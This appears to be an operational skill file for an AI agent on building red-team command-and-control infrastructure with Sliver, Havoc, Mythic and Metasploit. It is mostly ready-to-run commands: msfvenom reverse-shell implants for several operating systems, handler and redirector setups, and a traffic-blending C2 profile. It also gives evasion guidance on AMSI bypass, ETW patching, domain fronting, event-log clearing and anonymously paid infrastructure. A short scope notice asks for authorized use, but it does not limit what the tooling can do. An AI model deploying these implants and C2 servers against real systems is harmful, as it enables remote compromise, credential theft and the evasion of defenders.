## Cybersecurity Skills (Invoke First)

Before setting up C2 infrastructure, invoke these skills via the Skill tool:
- `cybersecurity-skills:building-c2-infrastructure-with-sliver-framework`
- `cybersecurity-skills:building-red-team-c2-infrastructure-with-havoc`
- `cybersecurity-skills:analyzing-cobalt-strike-beacon-configuration`
- `cybersecurity-skills:analyzing-cobaltstrike-malleable-c2-profiles`
- `cybersecurity-skills:analyzing-command-and-control-communication`
- `cybersecurity-skills:conducting-full-scope-red-team-engagement`
- `cybersecurity-skills:executing-red-team-engagement-planning`

## Scope Enforcement
C2 infrastructure MUST be operated within authorized engagement scope only.
Document all implant deployments with: time, target, operator, session ID.
Disable/destroy C2 infrastructure immediately after engagement ends.
NEVER use C2 infrastructure for targets not in scope.txt.

## Infrastructure Setup
```bash
mkdir -p evidence/$(date +%Y%m%d)/$TARGET/c2/{sessions,loot,implants,logs}

# Recommended C2 infrastructure:
# - VPS: separate from your identity, paid with privacy-focused method
# - Domain: plausible corporate name registered through privacy registrar
# - TLS: Let's Encrypt certificate for HTTPS blending
# - CDN: optionally front with Cloudflare for domain fronting (verify rules)

# Let's Encrypt certificate for C2 domain
certbot certonly --standalone \
  -d $C2_DOMAIN \
  --email $EMAIL \
  --agree-tos \
  --non-interactive 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/c2/cert_setup.log

# Point DNS:
# A record: $C2_DOMAIN → $LHOST (your VPS)
# A record: $C2_DOMAIN → $LHOST (your VPS)
```

## Sliver C2
```bash
# Start Sliver server (on attacker/C2 host)
sliver-server 2>&1 &

# Connect Sliver client
sliver-client 2>&1

# Inside Sliver console:
# Generate implants (mTLS = mutual TLS, most secure):
# generate --mtls $C2_DOMAIN --os windows --arch amd64 --save /tmp/implant.exe
# generate --mtls $C2_DOMAIN --os linux --arch amd64 --save /tmp/implant_linux
# generate --http $C2_DOMAIN --os windows --arch amd64 --save /tmp/implant_http.exe

# HTTPS implant (blends with web traffic):
# generate --https $C2_DOMAIN:443 --os windows --arch amd64 --skip-symbols --save /tmp/https_implant.exe

# Start listeners:
# mtls --lhost $LHOST --lport 8888
# https --lhost $LHOST --lport 443 --domain $C2_DOMAIN --cert /etc/letsencrypt/live/$C2_DOMAIN/fullchain.pem --key /etc/letsencrypt/live/$C2_DOMAIN/privkey.pem

# Session management:
# sessions                    → list active sessions
# sessions -i $SESSION_ID     → interact with session
# use $SESSION_ID             → select session

# Common Sliver commands (within session):
# info                        → target info
# whoami                      → current user
# shell                       → interactive shell
# upload /local/file /remote/path
# download /remote/path /local/dest
# ps                          → process list
# execute --output whoami
# socks5 start --host 127.0.0.1 --port 1080  → SOCKS proxy
# portfwd add --remote 3389 --local 13389     → port forward
# armory install all          → install extensions (hashdump, etc.)
# hashdump                    → dump local hashes
# screenshot                  → capture screen
```

## Havoc C2
```bash
# Havoc is an open-source C2 with malleable profiles (similar to Cobalt Strike)

# Start Havoc server with profile
./havoc server \
  --profile ./profiles/havoc.yaotl \
  --verbose 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/c2/havoc_server.log &

# Connect Havoc client (GUI)
./havoc client 2>&1 &
```

### Havoc Profile Template (yaotl)
```yaml
# havoc-profile.yaotl — Malleable C2 profile for Havoc
# Similar to Cobalt Strike malleable C2 profiles

profile:
  name: "ThreatSwarm-Blue"
  description: "Blends with enterprise blue team traffic"

  http:
    get:
      uri: [
        "/api/v2/updates",
        "/api/v2/config",
        "/api/v2/health",
        "/js/app.:[a-z0-9]{8}.js",
        "/css/style.:[a-z0-9]{8}.css"
      ]
      headers:
        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
        Accept-Language: "en-US,en;q=0.9"
        Accept-Encoding: "gzip, deflate, br"
        Connection: "keep-alive"

    post:
      uri: [
        "/api/v2/telemetry",
        "/api/v2/events",
        "/api/v2/metrics",
        "/api/v2/beacon"
      ]
      headers:
        Content-Type: "application/octet-stream"

    server:
      header: "nginx"
      powered_by: false

  sleep:
    mask: true  # jitter

  jitter: 37

  kill_date: "2026-06-30"
```

### Havoc Demon Operator Commands
```bash
# Havoc demon shell commands (within active session):
shell whoami
ps                  # process list
inject $PID $shellcode_file
token steal $PID
hashdump            # SAM dump
upload /local/file /remote/path
download /remote/path /local/dest

# Pivot capabilities:
socks 1080          # SOCKS proxy
portfwd add -l 8080 -p 80 -r 10.10.10.5  # port forward

# Lateral movement:
shinject $PID shellcode.bin  # inject shellcode into process

# Privilege escalation:
getsystem
getprivs

# Event log access:
eventlog clear     # clear security event log
```

### Mythic C2 Setup
```bash
# Mythic — agent-based C2 framework with modular architecture
# Install: https://github.com/its-a-feature/Mythic

# Start Mythic server (Docker)
# cd mythic && sudo ./mythic-cli start

# Connect Mythic web UI (https://localhost:7443)
# Create payload types (Apollo, Poseidon, etc.)

# Create listener:
# mythic-cli payload create http -name "HTTPS Listener" \
#   --url https://$C2_DOMAIN:443

# Generate payload:
# mythic-cli payload create http \
#   --callback_host $C2_DOMAIN \
#   --callback_port 443 \
#   --payload_type apollo \
#   --os windows \
#   --command sleep 60 --command jitter 30

# Mythic operator commands (within agent callback):
# shell whoami
# ls /path
# ps
# execute-command whoami
# load psexec    # load lateral movement module
# load rubeus    # load Kerberos module
# load sharpdump # load credential dumper
```

## Metasploit Multi/Handler
```bash
# Start persistent listener (handles multiple sessions)
msfconsole -q -x "
use exploit/multi/handler;
set PAYLOAD $PAYLOAD;
set LHOST $LHOST;
set LPORT $LPORT;
set ExitOnSession false;
set EnableStageEncoding true;
set StageEncoder x64/xor_dynamic;
exploit -j;
exit
" 2>&1 | tee evidence/$(date +%Y%m%d)/$TARGET/c2/msf_handler.log &

echo "[*] MSF handler running in background"
echo "[*] Run: msfconsole → sessions → sessions -i <ID>"
```

## msfvenom Payload Generation
```bash
# Windows x64 Meterpreter (HTTPS — encrypted, less detectable)
msfvenom \
  -p windows/x64/meterpreter_reverse_https \
  LHOST=$C2_DOMAIN \
  LPORT=443 \
  HttpsVerifyServer=0 \
  -e x64/xor_dynamic \
  -i 3 \
  -f exe \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/win_meterp_https.exe 2>&1

# Windows x64 DLL (for DLL sideloading)
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST \
  LPORT=$LPORT \
  -f dll \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/payload.dll 2>&1

# Windows x64 shellcode (for custom loader)
msfvenom \
  -p windows/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST \
  LPORT=$LPORT \
  -f raw \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/shellcode.bin 2>&1

# Linux ELF
msfvenom \
  -p linux/x64/meterpreter/reverse_tcp \
  LHOST=$LHOST \
  LPORT=$LPORT \
  -f elf \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/linux_shell 2>&1
chmod +x evidence/$(date +%Y%m%d)/$TARGET/c2/implants/linux_shell

# macOS Mach-O
msfvenom \
  -p osx/x64/meterpreter_reverse_tcp \
  LHOST=$LHOST \
  LPORT=$LPORT \
  -f macho \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/macos_shell 2>&1

# Python (cross-platform)
msfvenom \
  -p python/meterpreter/reverse_tcp \
  LHOST=$LHOST \
  LPORT=$LPORT \
  -f raw \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/payload.py 2>&1

# PowerShell (memory-only, no disk write)
msfvenom \
  -p windows/x64/meterpreter/reverse_https \
  LHOST=$C2_DOMAIN \
  LPORT=443 \
  -f psh-cmd \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/payload.ps1 2>&1
```

## HTTPS C2 Traffic Blending
```bash
# Configure C2 to mimic legitimate traffic patterns
# Key elements for blending:
# 1. Valid TLS certificate (Let's Encrypt on legitimate-looking domain)
# 2. Standard HTTP headers (mimic browser or Windows Update)
# 3. Reasonable sleep intervals with jitter
# 4. URI paths that look like normal web traffic

# Nginx reverse proxy for C2 (separates C2 from direct exposure)
cat > /etc/nginx/conf.d/c2_proxy.conf << 'NGINX'
server {
    listen 443 ssl;
    server_name $C2_DOMAIN;

    ssl_certificate /etc/letsencrypt/live/$C2_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$C2_DOMAIN/privkey.pem;

    # Route C2 beacon URIs to C2 backend
    location /updates/ {
        proxy_pass http://127.0.0.1:$C2_BACKEND_PORT;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    # All other requests → serve static page (looks like real website)
    location / {
        root /var/www/html;
        try_files $uri $uri/ =404;
    }
}
NGINX
nginx -t && nginx -s reload 2>&1
```

## C2 Profile Best Practices
```markdown
### Traffic Blending Guidelines
| Element | Bad (Detectable) | Good (Blends) |
|---------|------------------|-----------------|
| URI paths | /beacon, /submit | /api/v2/health, /js/app.abc123.js |
| User-Agent | python-requests/2.28 | Chrome/124.0 (realistic) |
| Sleep time | 1-5 seconds | 30-300 seconds with jitter |
| Jitter | 0% (constant interval) | 20-37% (realistic variance) |
| POST data | Raw shellcode | application/octet-stream |
| Server header | Apache/2.4 (mismatch) | nginx (match redirector) |
| Content-Type | text/plain | application/json, application/octet-stream |

### Implant Configuration
| Setting | Recommendation | Rationale |
|---------|---------------|----------|
| Sleep time | 60-300s | Avoid beaconing detection |
| Jitter | 20-37% | Mimic human browsing patterns |
| Kill date | Set for engagement end | Auto-cleanup |
| Watermark | Unique per engagement | Identify implant source |
| Indirect syscalls | Enabled | Bypass userland hooks |
| AMSI bypass | Enabled | Avoid script block logging |
| ETW patch | Enabled | Reduce EDR telemetry |

### Listener Management
- Use separate listeners for different implant types (Windows/Linux/macOS)
- Rotate listener domains if detection is suspected
- Monitor listener health and log connection anomalies
- Use domain fronting (CDN) for redirector separation
```

## Redirector Setup
```bash
# redirector_setup.sh — Set up an Nginx redirector for C2
# Usage: ./redirector_setup.sh <c2_domain> <c2_backend_ip> <c2_backend_port>

C2_DOMAIN="$1"
C2_IP="$2"
C2_PORT="$3"
REDIR_IP="$4"  # Redirector public IP

# Install Nginx
apt update && apt install -y nginx certbot python3-certbot-nginx

# Configure redirector
cat > /etc/nginx/sites-available/c2-redir << NGINXCONF
server {
    listen 80;
    server_name $C2_DOMAIN;
    return 301 https://\$host\$request_uri;
}

server {
    listen 443 ssl http2;
    server_name $C2_DOMAIN;

    ssl_certificate /etc/letsencrypt/live/$C2_DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$C2_DOMAIN/privkey.pem;

    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Rate limiting (looks legitimate)
    limit_req_zone \$binary_remote_addr zone=c2:10m rate=10r/s;

    # C2 traffic routes
    location ~ ^/api/v2/ {
        limit_req zone=c2 burst=20 nodelay;
        proxy_pass http://$C2_IP:$C2_PORT;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
    }

    # Everything else → legitimate site
    location / {
        root /var/www/html;
        try_files \$uri \$uri/ =404;
    }

    access_log /var/log/nginx/c2_access.log;
    error_log /var/log/nginx/c2_error.log;
}
NGINXCONF

# Enable and get cert
ln -sf /etc/nginx/sites-available/c2-redir /etc/nginx/sites-enabled/
certbot --nginx -d "$C2_DOMAIN" --non-interactive --agree-tos

nginx -t && systemctl restart nginx
echo "[+] Redirector ready: https://$C2_DOMAIN → http://$C2_IP:$C2_PORT"
```

## Implant Generation Workflow
```bash
# === Standard implant generation pipeline ===

# 1. Determine target environment (OS, AV/EDR, network restrictions)
# 2. Select C2 framework and profile
# 3. Generate implant with appropriate evasion settings
# 4. Test implant locally before deployment
# 5. Deploy via chosen delivery mechanism

# Sliver implant generation (examples)
# Windows — MTLS (most secure, requires cert):
sliver generate --mtls $C2_DOMAIN:8888 --os windows --arch amd64 \
  --skip-symbols --debug false \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/win_mtls.exe

# Windows — HTTPS (blends with web traffic):
sliver generate --https $C2_DOMAIN:443 --os windows --arch amd64 \
  --skip-symbols --sleeptime 60 --jitter 30 \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/win_https.exe

# Windows — DNS (bypasses most network restrictions):
sliver generate --dns dns.$C2_DOMAIN --os windows --arch amd64 \
  --skip-symbols \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/win_dns.exe

# Linux ELF:
sliver generate --mtls $C2_DOMAIN:8888 --os linux --arch amd64 \
  --skip-symbols \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/linux_mtls

# MSF payloads (fallback):
# Windows x64 Meterpreter (HTTPS):
msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=$C2_DOMAIN LPORT=443 HttpsVerifyServer=0 \
  -e x64/xor_dynamic -i 3 -f exe \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/win_meterp_https.exe

# PowerShell stager (memory-only):
msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=$C2_DOMAIN LPORT=443 \
  -f psh-cmd \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/payload.ps1

# Shellcode for custom loader:
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  -f raw -b "\x00\x0a\x0d\xff" \
  -o evidence/$(date +%Y%m%d)/$TARGET/c2/implants/shellcode.bin
```

## Operator Tradecraft Notes
```markdown
### Session Management
- Always log all commands with timestamps
- Use unique session labels (target-host-purpose)
- Kill sessions immediately if detection is suspected
- Never leave idle sessions connected
- Rotate implants if one shows signs of detection

### Credential Handling
- Never dump credentials to screen — redirect to file
- Hash all passwords before storing in evidence
- Use loot/ directory (not evidence/) for sensitive data
- Delete credential files after reporting

### Lateral Movement from C2
- Always test connectivity before pivoting
- Use SOCKS proxy for scanning through compromised host
- Log all lateral movement paths for the report
- Consider chain length (more hops = more OPSEC but slower)

### Anti-Analysis Techniques
- Set kill dates on ALL implants
- Use malleable C2 profiles to blend traffic
- Rotate callback domains if necessary
- Monitor for implant integrity (hash verification)
```

## Session Logging
```bash
# Log all C2 interactions with timestamps
cat > evidence/$(date +%Y%m%d)/$TARGET/c2/sessions/session_log_template.md << 'EOF'
## C2 Session Log — $TARGET — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### Infrastructure
- C2 Framework: [Sliver/Havoc/MSF]
- Listener: [protocol://host:port]
- Implant: [filename and hash]

### Active Sessions
| Session ID | Target Host | Username | OS | First Seen | Last Seen | Status |
|------------|-------------|----------|----|------------|-----------|--------|

### Commands Executed (ALL commands must be logged)
| Timestamp (UTC) | Session | Command | Output Summary | ATT&CK TTP |
|-----------------|---------|---------|----------------|------------|

### Loot Collected
| Item | Source | Location (reference only) |
|------|--------|--------------------------|
EOF

echo "[*] Log all sessions at: evidence/$(date +%Y%m%d)/$TARGET/c2/sessions/"
```
